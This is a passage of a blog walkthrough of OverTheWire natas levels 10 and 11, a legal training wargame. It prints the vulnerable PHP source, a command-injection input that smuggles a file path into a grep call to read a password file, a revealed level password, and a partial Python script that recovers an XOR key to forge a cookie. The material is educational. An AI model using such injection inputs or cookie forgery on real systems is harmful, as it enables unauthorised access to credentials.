<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v8.5.2 <https://hydejack.com/>
--><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><title>OverTheWire natas 10 - 14 | Fjanks security pages</title><meta name="generator" content="Jekyll v3.8.6" /><meta property="og:title" content="OverTheWire natas 10 - 14" /><meta name="author" content="Fjank" /><meta property="og:locale" content="en" /><meta name="description" content="A walkthrough of OverTheWire natas 10 - 14 with tool recommendations, recommendations for further reading, recommendations for protecting your server against attackers, failures and wins. Natas level 10-14 is quite easy, giving you a very gentle introduction to this wargame." /><meta property="og:description" content="A walkthrough of OverTheWire natas 10 - 14 with tool recommendations, recommendations for further reading, recommendations for protecting your server against attackers, failures and wins. Natas level 10-14 is quite easy, giving you a very gentle introduction to this wargame." /><link rel="canonical" href="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/" /><meta property="og:url" content="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/" /><meta property="og:site_name" content="Fjanks security pages" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-03-18T00:00:00+01:00" /> <script type="application/ld+json"> {"headline":"OverTheWire natas 10 - 14","dateModified":"2019-03-18T00:00:00+01:00","datePublished":"2019-03-18T00:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/"},"url":"https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/","author":{"@type":"Person","name":"Fjank"},"description":"A walkthrough of OverTheWire natas 10 - 14 with tool recommendations, recommendations for further reading, recommendations for protecting your server against attackers, failures and wins. Natas level 10-14 is quite easy, giving you a very gentle introduction to this wargame.","@context":"https://schema.org"}</script><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Fjanks security pages"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="application-name" content="Fjanks security pages"><meta name="msapplication-config" content="/assets/ieconfig.xml"><meta name="theme-color" content="rgb(25,55,71)"><meta name="generator" content="Hydejack v8.5.2" /><link type="application/atom+xml" rel="alternate" href="https://fjank.no/feed.xml" title="Fjanks security pages" /><link rel="alternate" href="https://fjank.no/blog/2019-03-18-overthewire-natas-10-14/" hreflang="en"><link rel="shortcut icon" href="/assets/icons/favicon.ico"><link rel="apple-touch-icon" href="/assets/icons/icon.png"><link rel="manifest" href="/assets/manifest.json"><link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="dns-prefetch" href="/" id="_baseURL"><link rel="dns-prefetch" href="/sw.js" id="_hrefSW"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js" id="_hrefKatexJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css" id="_hrefKatexCSS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/contrib/copy-tex.min.js" id="_hrefKatexCopyJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/contrib/copy-tex.min.css" id="_hrefKatexCopyCSS"><link rel="dns-prefetch" href="/assets/img/swipe.svg" id="_hrefSwipeSVG"><link rel="dns-prefetch" href="https://fjank-no.disqus.com" id="_hrefDisqus"> <script> !function(e,t){"use strict";function n(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,o){var r=t.createElement("script");r.src=e,o&&n(r,"load",o,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(r,a),r},e._loaded=!1,e.loadJSDeferred=function(o,r){function a(){e._loaded=!0,r&&n(c,"load",r,{once:!0});var o=t.scripts[0];o.parentNode.insertBefore(c,o)}var c=t.createElement("script");return c.src=o,e._loaded?a():n(e,"load",a,{once:!0}),c},e.setRel=e.setRelStylesheet=function(e){function o(){this.rel="stylesheet"}n(t.getElementById(e),"load",o,{once:!0})}}(window,document); ; !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); ; !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); ; !function(w, d) { w._noPushState = false; w._noDrawer = false; }(window, document); </script> <!--[if gt IE 8]><!----><style> body{--code-font-family: Menlo,Monaco,Consolas,monospace;--font-weight: 400;--font-weight-bold: 700;--font-weight-heading: 400;--text-muted: #888;--gray-bg: rgba(0,0,0,0.025);--gray-text: #666;--menu-text: #bbb;--body-color: #333;--body-bg: #fff;--border-color: #ebebeb}.clearfix,.sidebar-social::after{content:"";display:table;clear:both}.color-transition,body,p,hr,.hr,table:not(.highlight) td,table:not(.highlight) th,.message{transition:background-color 1s ease, border-color 1s ease}.no-color-transition{transition:none !important}*{box-sizing:border-box}html,body{margin:0;padding:0}html{font-size:16px;line-height:1.75}body{color:var(--body-color);background-color:var(--body-bg);font-weight:var(--font-weight);overflow-y:scroll}a{text-decoration:none}.lead{margin-left:-1rem;margin-right:-1rem}.content img,.img,.content video,.video{max-width:100%}.content img.lead,.img.lead,.content video.lead,.video.lead{max-width:calc(100% + 2rem);width:calc(100% + 2rem)}h1,h2,h3,h4,h5,h6,.h1,.h2,.h3,.h4,.h5,.h6{font-weight:var(--font-weight-heading);margin:5rem 0 1rem}h1,.h1{font-size:2rem;line-height:1.3}h2,.h2{font-size:1.5rem;line-height:1.4}h3,.h3{font-size:1.17em;line-height:1.5}h4,h5,h6,.h4,.h5,.h6{font-size:1rem;margin-bottom:0.5rem}p{margin-top:0;margin-bottom:1rem}p.lead{font-size:1.2em;margin-top:1.5rem;margin-bottom:1.5rem;padding:0 1rem}ul,ol,dl{margin-top:0;margin-bottom:1rem}ul,ol{padding-left:1.25rem}hr{position:relative;margin:3rem 0;border:0;border-top:1px solid var(--border-color)}.hr{border-bottom:1px solid var(--border-color);padding-bottom:1rem;margin-bottom:2rem}table:not(.highlight){border-collapse:collapse;margin-bottom:2rem;margin-left:-1rem}table:not(.highlight) td,table:not(.highlight) th{padding:.25rem .5rem;border:1px solid var(--border-color)}table:not(.highlight) td:first-child,table:not(.highlight) th:first-child{padding-left:1rem}table:not(.highlight) td:last-child,table:not(.highlight) th:last-child{padding-right:1rem}.page{margin-bottom:3em}.page li+li{margin-top:.25rem}.page>header{margin-bottom:2rem}.page-title,.post-title{margin-top:0}.post-date{display:block;margin-top:-0.5rem;margin-bottom:1rem;color:var(--text-muted)}.related-posts{padding-left:0;list-style:none;margin-bottom:2rem}.related-posts>li,.related-posts>li+li{margin-top:1rem}.message{margin-bottom:1rem;padding:1rem;color:var(--gray-text);background-color:var(--gray-bg);margin-left:-1rem;margin-right:-1rem}@media screen{body::before{content:'';width:.5rem;background:var(--border-color);position:fixed;left:0;top:0;bottom:0}}@media screen and (min-width: 64em){body::before{width:21rem}}@media screen and (min-width: 1666px){body::before{width:calc(50% - 28rem)}}@media screen and (min-width: 42em){html{font-size:17px}}@media screen and (min-width: 124em){html{font-size:18px}}.fade-in{animation-duration:500ms;animation-timing-function:ease;animation-name:fade-in;animation-fill-mode:forwards}@keyframes fade-in{from{transform:translateY(-3rem);opacity:0}50%{transform:translateY(-3rem);opacity:0}to{transform:translateY(0);opacity:1}}.fl{float:left}.fr{float:right}.mb4{margin-bottom:4rem}.mb6{margin-bottom:6rem}.mt0{margin-top:0}.mt2{margin-top:2rem}.mt3{margin-top:3rem}.mt4{margin-top:4rem}.pb0{padding-bottom:0}.sixteen-nine{position:relative}.sixteen-nine::before{display:block;content:"";width:100%;padding-top:56.25%}.sixteen-nine>*{position:absolute;top:0;left:0;right:0;bottom:0}.sr-only{display:none}.border{border:1px solid var(--border-color)}hy-push-state a,.a{position:relative;padding-bottom:.15rem;border-bottom:1px solid}hy-push-state a.no-hover,.a.no-hover{border-bottom:none;padding-bottom:0}.content .img{overflow:hidden}.content .img img{margin:0;width:100%;height:100%;background-color:var(--gray-bg)}hy-drawer{width:100%;position:relative;overflow:hidden}@media screen and (min-width: 64em){hy-drawer{position:fixed;width:21rem;top:0;left:0;bottom:0;margin-left:0}hy-drawer.cover{position:relative;width:100%}}@media screen and (min-width: 1666px){hy-drawer{width:calc(50% - 28rem)}}.sidebar{position:relative;display:flex;justify-content:center;align-items:center;color:rgba(255,255,255,0.75);text-align:center;z-index:2;min-height:100vh}.sidebar a{color:#fff;border-bottom-color:rgba(255,255,255,0.2)}.sidebar-bg{position:absolute;top:0;left:calc(50% - 50vw);width:100vw;height:100%;background:#202020 center / cover}.sidebar-bg::after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:rgba(0,0,0,0.05)}.sidebar-bg.sidebar-overlay::after{background:linear-gradient(to bottom, rgba(32,32,32,0) 0%, rgba(32,32,32,0.5) 50%, rgba(32,32,32,0) 100%)}.sidebar-sticky{position:relative;z-index:3;max-width:21rem;padding:1.5rem;contain:content}.sidebar-about .avatar{margin-bottom:1.5rem}.sidebar-about>h2{margin-top:0}.sidebar-nav>ul{list-style:none;padding-left:0}a.sidebar-nav-item{display:inline-block;font-weight:var(--font-weight-heading);line-height:1.75;padding:.25rem;border-bottom:1px solid rgba(255,255,255,0.2)}.sidebar-social>ul{display:inline-block;list-style:none;padding-left:0;margin-bottom:0}.sidebar-social>ul>li{float:left}.sidebar-social>ul>li>a{display:inline-block;text-align:center;font-size:1.4rem;width:3rem;height:4rem;padding:.5rem 0;line-height:3rem}.sidebar-social>ul li+li{margin-top:0}.fixed-common,.fixed-top,.fixed-bottom{position:fixed;left:0;width:100%;z-index:2}.fixed-top{top:0}.fixed-bottom{bottom:0}.navbar>.content{padding-top:0;padding-bottom:0;min-height:0;color:var(--menu-text)}.nav-btn-bar{margin:0 -1rem 0 -.875rem}.nav-btn{background:none;border:none;padding:1.75rem .875rem;color:var(--menu-text) !important;cursor:pointer}.animation-main{opacity:0;pointer-events:none}.content{position:relative;margin-left:auto;margin-right:auto;padding:6rem 1rem 12rem}@media screen{.content{padding-left:1.5rem;max-width:38rem;min-height:100vh}}@media screen and (min-width: 54em){.content{max-width:42rem}}@media screen and (min-width: 64em){.content{padding-left:1rem;margin-left:24rem;margin-right:3rem}}@media screen and (min-width: 88em){.content{margin-left:25rem;margin-right:4rem;max-width:48rem}}@media screen and (min-width: 1666px){.content{margin:auto}}.avatar{width:6.5rem;height:6.5rem;border-radius:100%;overflow:hidden}@media screen and (min-width: 88em){.avatar{width:7rem;height:7rem}}.content .avatar{float:right;margin-left:.5rem}html{font-family:Noto Sans,Helvetica,Arial,sans-serif}h1,h2,h3,h4,h5,h6,.h1,.h2,.h3,.h4,.h5,.h6,.heading{font-family:Roboto Slab,Helvetica,Arial,sans-serif}.content a:not(.btn){color:#4fb1ba;border-color:rgba(79,177,186,0.2)}.content a:not(.btn):hover{border-color:#4fb1ba}:focus{outline-color:#4fb1ba !important}.btn-primary{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:focus,.btn-primary.focus,.form-control:focus,.form-control.focus{box-shadow:0 0 0 3px rgba(79,177,186,0.5)}.btn-primary:hover,.btn-primary.hover{color:#fff;background-color:#409ba3;border-color:#409ba3}.btn-primary:disabled,.btn-primary.disabled{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:active,.btn-primary.active{color:#fff;background-color:#409ba3;border-color:#409ba3}::selection{color:#fff;background:#4fb1ba}::-moz-selection{color:#fff;background:#4fb1ba}</style><link rel="preload" as="style" href="/assets/css/hydejack-8.5.2.css" id="_stylePreload"><link rel="preload" as="style" href="/assets/icomoon/style.css" id="_iconsPreload"><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i&display=swap" id="_fontsPreload"> <script>setRel('_stylePreload');setRel('_iconsPreload');/**/setRel('_fontsPreload');/**/</script> <noscript><link rel="stylesheet" href="/assets/css/hydejack-8.5.2.css"><link rel="stylesheet" href="/assets/icomoon/style.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i&display=swap"> </noscript> <!--<![endif]--><body class="no-color-transition"><div id="_navbar" class="navbar fixed-top"><div class="content"><div class="nav-btn-bar"> <span class="sr-only">Jump to:</span> <a id="_menu" class="nav-btn no-hover fl" href="#_navigation"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a></div></div></div><hr class="sr-only" hidden /> <hy-push-state replace-ids="_main" link-selector="a[href]:not([href*='/assets/']):not(.external):not(.no-push-state)" duration="250" script-selector="script:not([type^='math/tex'])" prefetch ><main id="_main" class="content fade-in layout-post" role="main" data-color="rgb(79,177,186)" data-theme-color="rgb(25,55,71)" data-image="/assets/img/sidebar-bg.jpg" data-overlay ><article id="post-blog-overthewire-natas-10-14" class="page post mb6 h-entry" role="article"><header><h1 class="post-title p-name"> OverTheWire natas 10 - 14</h1><p class="post-date heading"> <time class="dt-published" datetime="2019-03-18T00:00:00+01:00">18 Mar 2019</time> in <a href="/blog/" class="flip-title">Blog</a><p class="message" > A walkthrough of OverTheWire natas 10 - 14 with tool recommendations, recommendations for further reading, recommendations for protecting your server against attackers, failures and wins. Natas level 10-14 is quite easy, giving you a very gentle introduction to this wargame.</header><div class="e-content"><p><a href="/blog/2019-03-17-overthewire-natas-5-9/">Read Previous - OverTheWire level 5-9 walkthrough.</a><h2 id="introduction">Introduction</h2><p><a href="http://overthewire.org">OverTheWire</a> is a wargame site with several challenges. It contains several challenges with a nice increase in difficulty. This is the third entry of a writeup of the <a href="http://overthewire.org/wargames/natas/">natas</a> challenges, which teaches the basics of serverside web-security. I will walk you through the mind-process of searching for and finding vulnerabilities.<p>By going through all the levels of these challenges, you will learn how to break basic security (and protect against these attacks!), gain basic knowledge on various tools such as: html, server configuration, browser developer tools, basic shell commands, vulnerability checker tools, kali linux and get some basic programming experience.<h2 id="level-10"><a href="http://natas10.natas.labs.overthewire.org/">Level 10</a></h2><p>We are on this level met with yet another search, with a hint that they filter certain characters. This time also they have been kind enough to give us the server source code. <hy-img root-margin="512px" src="/assets/img/blog/natas/overthewire-natas-10-1.png" alt="Natas 10 landing page">  <noscript><img data-ignore src="/assets/img/blog/natas/overthewire-natas-10-1.png" alt="Natas 10 landing page"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">For</span> <span class="nx">security</span> <span class="nx">reasons</span><span class="p">,</span> <span class="nx">we</span> <span class="nx">now</span> <span class="nx">filter</span> <span class="nx">on</span> <span class="nx">certain</span> <span class="nx">characters</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nx">form</span><span class="o">&gt;</span>
<span class="nx">Find</span> <span class="nx">words</span> <span class="nx">containing</span><span class="o">:</span> <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="nx">needle</span><span class="o">&gt;&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">name</span><span class="o">=</span><span class="nx">submit</span> <span class="nx">value</span><span class="o">=</span><span class="nx">Search</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>


<span class="nx">Output</span><span class="o">:</span>
<span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
<span class="o">&lt;?</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"needle"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"needle"</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[;|&amp;]/'</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s2">"Input contains an illegal character!"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">passthru</span><span class="p">(</span><span class="s2">"grep -i </span><span class="nv">$key</span><span class="s2"> dictionary.txt"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/pre&gt;</span>
</code></pre></div></div><p>Passthru is still used, as in natas9, and they filter against these characters: <code class="highlighter-rouge">;|&amp;</code> Well, we could just grep for an empty string in any file, and we will get the entire file. Thus a search for <code class="highlighter-rouge">"" /etc/natas_webpass/natas11 #</code> that contains no illegal characters will give us the password for natas11.<br /> <em>whitelist, not blacklist</em> <details> <summary>Spoiler</summary> natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK </details><h2 id="level-11"><a href="http://natas11.natas.labs.overthewire.org/">Level 11</a></h2><p>We are met with a hint “Cookies are protected with <a href="https://en.wikipedia.org/wiki/XOR_cipher">XOR encryption</a>”, an input field prefilled with a <a href="https://en.wikipedia.org/wiki/Web_colors">hex triplet</a>, a button, and the sourcecode. If we change the color, the background of that page changes the color. <hy-img root-margin="512px" src="/assets/img/blog/natas/natas11-1.png" alt="Natas 11 landing page">  <noscript><img data-ignore src="/assets/img/blog/natas/natas11-1.png" alt="Natas 11 landing page"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img><div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?</span>

<span class="nv">$defaultdata</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">"showpassword"</span><span class="o">=&gt;</span><span class="s2">"no"</span><span class="p">,</span> <span class="s2">"bgcolor"</span><span class="o">=&gt;</span><span class="s2">"#ffffff"</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'&lt;censored&gt;'</span><span class="p">;</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>

    <span class="c1">// Iterate through each character</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">loadData</span><span class="p">(</span><span class="nv">$def</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="nv">$_COOKIE</span><span class="p">;</span>
    <span class="nv">$mydata</span> <span class="o">=</span> <span class="nv">$def</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"data"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$tempdata</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"data"</span><span class="p">])),</span> <span class="kc">true</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"showpassword"</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"bgcolor"</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^#(?:[a-f\d]{6})$/i'</span><span class="p">,</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">'showpassword'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">'showpassword'</span><span class="p">];</span>
        <span class="nv">$mydata</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$tempdata</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$mydata</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">saveData</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"data"</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$d</span><span class="p">))));</span>
<span class="p">}</span>

<span class="nv">$data</span> <span class="o">=</span> <span class="nx">loadData</span><span class="p">(</span><span class="nv">$defaultdata</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"bgcolor"</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^#(?:[a-f\d]{6})$/i'</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$data</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">saveData</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>



<span class="cp">?&gt;</span>

<span class="nt">&lt;h1&gt;</span>natas11<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>
<span class="nt">&lt;body</span> <span class="na">style=</span><span class="s">"background: </span><span class="cp">&lt;?=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">;"</span><span class="nt">&gt;</span>
Cookies are protected with XOR encryption<span class="nt">&lt;br/&gt;&lt;br/&gt;</span>

<span class="cp">&lt;?</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s2">"showpassword"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"yes"</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"The password for natas12 is &lt;censored&gt;&lt;br&gt;"</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>

<span class="nt">&lt;form&gt;</span>
Background color: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">bgcolor</span> <span class="na">value=</span><span class="s">"</span><span class="cp">&lt;?=</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'bgcolor'</span><span class="p">]</span><span class="cp">?&gt;</span><span class="s">"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">"Set color"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

</code></pre></div></div><p>Looking at the sourcecode, it is clear that we need to get the variable <code class="highlighter-rouge">$data["showpassword"]</code> changed from no to yes. It seems like if we set a bgcolor from the page the data is updated and the function <code class="highlighter-rouge">saveData</code> is called. <code class="highlighter-rouge">saveData</code> does a <a href="https://en.wikipedia.org/wiki/JSON">json-encoding</a>, xor encryption, <a href="https://en.wikipedia.org/wiki/Base64">base64 encoding</a> and sets this as a cookie. The other function ‘loadData’ does the opposite reading the values from a cookie. Finally there is the actual XOR encryption. A basic XOR encryption with a key that we do not get.<p>So it seems our task is to manipulate the cookie, as that is where the showpassword key is. XOR encryption is quite simple to break: A plaintext XORed with a key result in an encrypted bytes.<br /> Opposite, encrypted bytes XORed with the key, result in the plaintext.<br /> Interesting enough, plaintext XORed with encrypted will result in the key.<br /> We can use that last rule as our attack, as we know the plaintext, and we know the encrypted bytes (they are in the cookie). When we successfully have retrieved the key, its trivial the encrypt a new cookie, request the page and retrieve the password. I will do this programmatically with python, comments in the code explain what I do.<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">'http://natas11:&lt;redacted&gt;@natas11.natas.labs.overthewire.org/'</span>


<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">bytes1</span><span class="p">,</span> <span class="n">bytes2</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b1</span> <span class="o">^</span> <span class="n">b2</span> <span class="k">for</span> <span class="p">(</span><span class="n">b1</span><span class="p">,</span> <span class="n">b2</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">bytes1</span><span class="p">,</span> <span class="n">bytes2</span><span class="p">)])</span>


<span class="c1"># Get the initial page with the supplied username/password.
</span><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="c1"># Get the data cookie, base64 decode it resulting in encrypted bytes.
</span><span class="n">encrypted</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'data'</span><span class="p">]))</span>

<span class="c1"># Using a small piece if the json representation of the default-data as left side of xor, and encrypted bytes as right side.
# Try and fail gives us the xor key length, and here it was 4 characters.
</span><span class="n">xorKey</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">b</span><span class="s">'{"sh'</span><span class="p">,</span> <span class="n">encrypted</span><span class="p">)</span>

<span class="c1"># recreate a fake cookie (using 44 as total length), and request the server again.
